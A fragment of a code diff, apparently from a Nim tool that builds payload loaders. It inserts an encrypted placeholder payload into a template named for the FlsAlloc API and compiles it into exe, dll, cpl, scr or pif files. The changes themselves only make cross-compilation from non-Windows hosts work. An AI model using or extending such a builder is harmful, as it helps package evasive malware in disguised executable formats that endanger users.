-                let file_path = ".\\apiMethods\\FlsAlloc\\FlsAlloc.nim"
+                let file_path = "apiMethods/FlsAlloc/FlsAlloc.nim"
                 var file_target = file_path.readFile()
 
                 let placeholder = "REPLACE_ME"
@@ -917,22 +916,22 @@ proc main() =
 
 
                 #add dictionary stuff perhaps later?
-                #let dic_file_path = ".\\apiMethods\\FlsAlloc\\dictionary.txt"
+                #let dic_file_path = "apiMethods/FlsAlloc/dictionary.txt"
                 #var dictionary = dic_file_path.readFile()
                 #let dictionary_placeholder = "DICTIONARY_ME"
                 #let dictionary_replacement = dictionary
 
 
                 if fileType == "exe":
-                    discard execShellCmd("nim -d:release --out:FlsAlloc.exe --app:gui c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                    discard execShellCmd("nim -d:release -d:mingw --out:FlsAlloc.exe --app:gui c apiMethods/FlsAlloc/FlsAlloc.nim")
                 elif fileType == "dll":
-                    discard execShellCmd("nim -d:release --out:FlsAlloc.dll --app:lib c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                    discard execShellCmd("nim -d:release -d:mingw --out:FlsAlloc.dll --app:lib c apiMethods/FlsAlloc/FlsAlloc.nim")
                 elif fileType == "cpl":
-                    discard execShellCmd("nim -d:release --out:FlsAlloc.cpl --app:lib c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                    discard execShellCmd("nim -d:release -d:mingw --out:FlsAlloc.cpl --app:lib c apiMethods/FlsAlloc/FlsAlloc.nim")
                 elif fileType == "scr":
-                    discard execShellCmd("nim -d:release --out:FlsAlloc.scr --app:gui c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                    discard execShellCmd("nim -d:release -d:mingw --out:FlsAlloc.scr --app:gui c apiMethods/FlsAlloc/FlsAlloc.nim")
                 elif fileType == "pif": #experimenting with PIF...
-                    discard execShellCmd("nim -d:release --out:FlsAlloc.pif --app:gui c .\\apiMethods\\FlsAlloc\\FlsAlloc.nim")
+                    discard execShellCmd("nim -d:release -d:mingw --out:FlsAlloc.pif --app:gui c apiMethods/FlsAlloc/FlsAlloc.nim")
                 else:
                     echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING.\n"
                 let placeholder_new = encodedCrypted
@@ -958,7 +957,7 @@ proc main() =
 
 
 #catch all
-when defined(windows):
+when true:
     if 1>0:
         if paramCount() <= 3:
             if paramCount() == 3:
